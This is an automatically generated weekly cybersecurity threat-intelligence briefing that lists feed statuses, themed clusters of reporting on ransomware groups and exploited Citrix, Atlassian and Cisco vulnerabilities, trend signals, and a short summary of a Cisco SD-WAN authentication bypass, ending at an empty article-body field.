# PHANTOMSignal Briefing Packet

- Generated: 2026-10-07T16:17:11.386081+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 75
- Total items in window: 423
- Total clusters raw: 215
- Total clusters in packet: 80
- Dropped low score: 133
- Dropped overflow: 2

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 0
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 9
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 2
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 2
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 9
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 17
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 20
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 20
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 100
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 7
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 27
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 25
  - In window count: 25
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 1

## Affinity groups (themes)

### ShinyHunters: ransomware extortion
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 10
- Article count: 16
- Cohesion: 0.335
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, zero_day
  - actor_attribution: ShinyHunters
  - affected_industries: government, financial_services
  - affected_products: OpenAI/ChatGPT
  - urgency_signals: zero_day
- Cluster IDs: e0b5b97ad2, 057570cc1b, 0be1df44fd, 88364fe6d8, 9040cd1db5, 3f141695df, f9aeb759c4, c18e100563, 133969943e, ccad21af09
- Links:
  - https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
  - https://thehackernews.com/2026/10/critical-fortimail-zero-day-flaw.html
  - https://cyberscoop.com/fortibleed-fortinet-vpn-ransomware-fbi-warning/
  - https://www.team-cymru.com/post/cyber-security-intelligence-edge-device-analysis
  - https://www.helpnetsecurity.com/2026/10/07/fortinet-fortibleed-campaign-fbi-advisory/
  - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
  - https://www.securityweek.com/georgia-power-alabama-power-data-breach-hits-400000-accounts/
  - https://www.securityweek.com/advantest-discloses-data-breach-months-after-ransomware-attack/
  - https://www.securityweek.com/asos-confirms-cyberattack-data-breach/
  - https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
  - https://thehackernews.com/2026/10/attackers-target-rejetto-hfs-flaw-that.html
  - https://risky.biz/SRB185/
  - https://thehackernews.com/2026/10/fbi-removes-accenture-contractor-after.html

### Citrix exploitation (2 CVEs)
- Anchor signal: Citrix
- Theme key: citrix
- Cluster count: 10
- Article count: 13
- Cohesion: 0.253
- Shared strong signals: Citrix
- Member CVEs: CVE-2026-88771, CVE-2026-88772
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, data_breach, active_exploitation, ransomware_extortion
  - actor_attribution: ShinyHunters
  - affected_industries: government, financial_services
  - affected_products: Citrix, OpenAI/ChatGPT
  - urgency_signals: zero_day, actively_exploited, preauth_unauth
- Cluster IDs: e51eaa3924, bd1b3dce0b, 257c7d4fe7, e0b5b97ad2, f8ded28673, f28e2b9829, 9040cd1db5, 3f141695df, c18e100563, 133969943e
- Links:
  - https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
  - https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
  - https://www.sophos.com/en-us/blog/citrix-netscaler-vulnerability-cve-2026-88779-in-active-exploitation
  - https://thehackernews.com/2026/10/new-netscaler-zero-day-exploited-in.html
  - https://www.infosecurity-magazine.com/news/citrix-netscaler-zero-day/
  - https://www.reddit.com/r/cybersecurity/comments/1wz5746/exploitation_of_citrix_netscaler_zeroday_hits/
  - https://cyberscoop.com/citrix-netscaler-third-exploited-zero-day-vulnerability/
  - https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
  - https://www.securityweek.com/atlassian-patches-critical-vulnerability-affecting-8-products/
  - https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
  - https://www.securityweek.com/georgia-power-alabama-power-data-breach-hits-400000-accounts/
  - https://www.securityweek.com/advantest-discloses-data-breach-months-after-ransomware-attack/
  - https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
  - https://thehackernews.com/2026/10/attackers-target-rejetto-hfs-flaw-that.html

### Snowflake active exploitation
- Anchor signal: Snowflake
- Theme key: snowflake
- Cluster count: 6
- Article count: 8
- Cohesion: 0.27
- Shared strong signals: Snowflake
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, active_exploitation
  - affected_industries: education
  - affected_products: Snowflake
  - urgency_signals: actively_exploited, no_patch_yet
- Cluster IDs: cc01b95e10, f9aeb759c4, 7ab7500e98, 5abaf61ca8, 4e072e3956, afa4dde99a
- Links:
  - https://www.rapid7.com/blog/post/it-asos-incident-attackers-using-channels-customers-trust
  - https://www.infosecurity-magazine.com/news/asos-customers-message-suspected/
  - https://www.reddit.com/r/cybersecurity/comments/1wyxsx7/looks_like_asos_in_the_uk_just_got_breached_again/
  - https://www.securityweek.com/asos-confirms-cyberattack-data-breach/
  - https://www.infosecurity-magazine.com/news/pwn2own-hackers-32-zeroday/
  - https://www.infosecurity-magazine.com/news/clingstun-backdoor-unpatched-iot/
  - https://www.infosecurity-magazine.com/news/critical-cisco-catalyst-sdwan/
  - https://www.bleepingcomputer.com/news/security/asos-confirms-data-breach-after-hacked-in-app-notifications/

### Cl0p: ransomware extortion
- Anchor signal: Cl0p
- Theme key: cl0p
- Cluster count: 5
- Article count: 5
- Cohesion: 0.383
- Shared strong signals: Cl0p
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, zero_day, active_exploitation, apt_espionage
  - actor_attribution: Cl0p, ShinyHunters
  - affected_industries: manufacturing_industrial
  - urgency_signals: actively_exploited, zero_day
- Cluster IDs: e0b5b97ad2, 498d32f5a8, 0be1df44fd, 88364fe6d8, fb556ca51b
- Links:
  - https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
  - https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
  - https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence

### CVE-2026-76504 exploitation activity
- Anchor signal: CVE-2026-76504
- Theme key: cve-2026-76504
- Cluster count: 3
- Article count: 4
- Cohesion: 0.234
- Shared strong signals: CVE-2026-76504
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_industries: education
  - cve_ids: CVE-2026-76504
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: 6cea51bc24, f28e2b9829, 4e072e3956
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - https://thehackernews.com/2026/10/cisa-adds-exploited-cisco-catalyst-sd.html
  - https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
  - https://www.infosecurity-magazine.com/news/critical-cisco-catalyst-sdwan/

### npm active exploitation
- Anchor signal: npm
- Theme key: npm
- Cluster count: 3
- Article count: 8
- Cohesion: 0.215
- Shared strong signals: npm
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: data_breach, zero_day, active_exploitation, ransomware_extortion, web_shell_backdoor
  - affected_industries: healthcare
  - affected_products: npm, Citrix
  - urgency_signals: actively_exploited, zero_day, preauth_unauth
- Cluster IDs: bd1b3dce0b, f8ded28673, f9aeb759c4
- Links:
  - https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
  - https://www.sophos.com/en-us/blog/citrix-netscaler-vulnerability-cve-2026-88779-in-active-exploitation
  - https://thehackernews.com/2026/10/new-netscaler-zero-day-exploited-in.html
  - https://www.infosecurity-magazine.com/news/citrix-netscaler-zero-day/
  - https://www.reddit.com/r/cybersecurity/comments/1wz5746/exploitation_of_citrix_netscaler_zeroday_hits/
  - https://www.securityweek.com/atlassian-patches-critical-vulnerability-affecting-8-products/
  - https://www.securityweek.com/asos-confirms-cyberattack-data-breach/

### Cisco vulnerability activity
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 2
- Article count: 3
- Cohesion: 0.273
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Cisco
- Cluster IDs: 6cea51bc24, fb1a8533f5
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - https://thehackernews.com/2026/10/cisa-adds-exploited-cisco-catalyst-sd.html
  - https://blog.talosintelligence.com/the-fine-art-of-frustrating-the-adversary/

### CVE-2026-21589 exploitation activity
- Anchor signal: CVE-2026-21589
- Theme key: cve-2026-21589
- Cluster count: 2
- Article count: 11
- Cohesion: 0.466
- Shared strong signals: CVE-2026-21589
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-21589
  - urgency_signals: preauth_unauth
- Cluster IDs: a4d6dda2bb, f8ded28673
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-21589-critical-unauthenticated-arbitrary-file-access-in-atlassian-products
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-21589/
  - https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/
  - https://isc.sans.edu/diary/rss/33406
  - https://www.helpnetsecurity.com/2026/10/07/exploitation-critical-atlassian-flaw-cve-2026-21589/
  - https://www.reddit.com/r/cybersecurity/comments/1wz839l/you_wont_hear_about_these_even_in_myths_atlassian/
  - https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-atlassian-flaw-after-public-poc-release/
  - https://thehackernews.com/2026/10/atlassian-data-center-flaw-draws.html
  - https://www.securityweek.com/atlassian-patches-critical-vulnerability-affecting-8-products/

### CVE-2026-86950 exploitation activity
- Anchor signal: CVE-2026-86950
- Theme key: cve-2026-86950
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: CVE-2026-86950
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_industries: government
  - cve_ids: CVE-2026-86950
- Cluster IDs: 43806a18a6, f28e2b9829
- Links:
  - https://thehackernews.com/2026/10/apple-coregraphics-poc-emerges-as.html
  - https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/

### Apple iOS/macOS vulnerability activity
- Anchor signal: Apple iOS/macOS
- Theme key: apple-ios-macos
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: Apple iOS/macOS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Apple iOS/macOS
- Cluster IDs: 43806a18a6, f9aeb759c4
- Links:
  - https://thehackernews.com/2026/10/apple-coregraphics-poc-emerges-as.html
  - https://www.securityweek.com/asos-confirms-cyberattack-data-breach/

## Forward signals

### Novelty
- Novel cves: 3
  - CVE-2026-105192 (first seen via The Hacker News at 2026-10-07T15:34:53+00:00, cluster bacba30b6e)
  - CVE-2026-105756 (first seen via The Hacker News at 2026-10-07T15:34:53+00:00, cluster bacba30b6e)
  - CVE-2024-23692 (first seen via The Hacker News at 2026-10-05T08:09:23+00:00, cluster 133969943e)
- Novel actors: 0
- Novel products: 0

### Velocity bursts (2)
- **CVE-2026-21589: Critical unauthenticated arbitrary file access in Atlassian products**
  - Cluster: a4d6dda2bb
  - Sources in window: 3
  - Window hours: 1.0
  - Cohort count: 4
- **Quoting Victoria Kim**
  - Cluster: 3f513381cd
  - Sources in window: 3
  - Window hours: 5.3
  - Cohort count: 3

### Leading edge (1)
- **The ASOS Incident: When Attackers Use the Channels Customers Trust**
  - Cluster: cc01b95e10
  - Lead hours: 25.6
  - First source: Reddit r/cybersecurity
  - Later Tier 1 source: Rapid7
  - Shared signals: Snowflake

### Convergence (15)
- Pair: CVE-2026-76504 + Cisco (cluster 6cea51bc24, first observation: True)
- Pair: CVE-2026-88771 + Palo Alto Networks (cluster e51eaa3924, first observation: True)
- Pair: CVE-2026-88772 + Palo Alto Networks (cluster e51eaa3924, first observation: True)
- Pair: CVE-2026-88779 + Citrix (cluster bd1b3dce0b, first observation: True)
- Pair: CVE-2026-88779 + WordPress (cluster bd1b3dce0b, first observation: True)
- Pair: CVE-2026-88779 + npm (cluster bd1b3dce0b, first observation: True)
- Pair: CVE-2026-102489 + Anthropic/Claude (cluster 385168e58d, first observation: True)
- Pair: CVE-2026-102489 + GitHub (cluster 385168e58d, first observation: True)
- Pair: CVE-2026-102490 + Anthropic/Claude (cluster 385168e58d, first observation: True)
- Pair: CVE-2026-102490 + GitHub (cluster 385168e58d, first observation: True)
- Pair: CVE-2026-21589 + Atlassian Confluence (cluster a4d6dda2bb, first observation: True)
- Pair: CVE-2026-21589 + Atlassian Jira (cluster a4d6dda2bb, first observation: True)
- Pair: CVE-2026-88771 + Citrix (cluster 257c7d4fe7, first observation: True)
- Pair: CVE-2026-88779 + Citrix (cluster 257c7d4fe7, first observation: True)
- Pair: CVE-2026-104286 + Cl0p (cluster e0b5b97ad2, first observation: True)

### Drift (5)
- **Cl0p** (cluster e0b5b97ad2)
  - New industries: (none)
  - New products: Citrix, Fortinet
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Microsoft 365, OpenAI/ChatGPT, SolarWinds
- **ShinyHunters** (cluster e0b5b97ad2)
  - New industries: (none)
  - New products: Citrix, Fortinet
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: Anthropic/Claude, OpenAI/ChatGPT, Salesforce
- **Akira** (cluster f273b2b0d8)
  - New industries: (none)
  - New products: Anthropic/Claude, OpenAI/ChatGPT
  - Prior top industries: education, financial_services, healthcare
  - Prior top products: Microsoft Defender, Microsoft SharePoint, SonicWall
- **APT31** (cluster 7c42269e48)
  - New industries: critical_infrastructure
  - New products: (none)
  - Prior top industries: education, financial_services, government
  - Prior top products: GitHub, Microsoft SharePoint, Microsoft Windows
- **Nimbus Manticore** (cluster a781629acb)
  - New industries: (none)
  - New products: GitHub
  - Prior top industries: aviation_defense, critical_infrastructure, telecommunications
  - Prior top products: Apple iOS/macOS, Gogs, Microsoft Entra

### Persistence (15)
- actor_attribution: ShinyHunters (weeks observed: 13, cluster e0b5b97ad2)
- actor_attribution: Cl0p (weeks observed: 11, cluster e0b5b97ad2)
- actor_attribution: Scattered Spider (weeks observed: 11, cluster fc5c9992d3)
- actor_attribution: BlackCat/ALPHV (weeks observed: 8, cluster fc5c9992d3)
- actor_attribution: UNC5221 (weeks observed: 6, cluster b04cf6724c)
- actor_attribution: RansomHub (weeks observed: 6, cluster fc5c9992d3)
- actor_attribution: APT31 (weeks observed: 5, cluster 7c42269e48)
- cve_ids: CVE-2026-22769 (weeks observed: 5, cluster b04cf6724c)
- actor_attribution: UNC6201 (weeks observed: 5, cluster b04cf6724c)
- cve_ids: CVE-2025-53770 (weeks observed: 4, cluster 7c42269e48)
- actor_attribution: APT27 (weeks observed: 4, cluster 7c42269e48)
- cve_ids: CVE-2026-73570 (weeks observed: 4, cluster 6fe9c57718)
- actor_attribution: Nimbus Manticore (weeks observed: 4, cluster a781629acb)
- cve_ids: CVE-2026-88771 (weeks observed: 3, cluster e51eaa3924)
- cve_ids: CVE-2026-88772 (weeks observed: 3, cluster e51eaa3924)

### Tier inversion (1)
- **Citrix NetScaler Zero-Day Exploited in the Wild Crashes SAML Authentication Services**
  - Cluster: bd1b3dce0b
  - Primary source: Orca Security Research
  - Strong signals: CVE-2026-88779

## Clusters

### Cluster 6cea51bc24 — score 60

- Title: CVE-2026-76504 | Cisco Catalyst SD-WAN Manager API Authentication Bypass Vulnerability | Reversed by Horizon3
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-01T00:35:46+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-76504

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-76504
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-76504
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-76504 is a critical, actively exploited Cisco Catalyst SD-WAN Manager vulnerability that allows unauthenticated API access as the admin user. Horizon3 reverse engineered the flaw, and NodeZero® Rapid Response safely validates exposure.
```

#### Full body

```
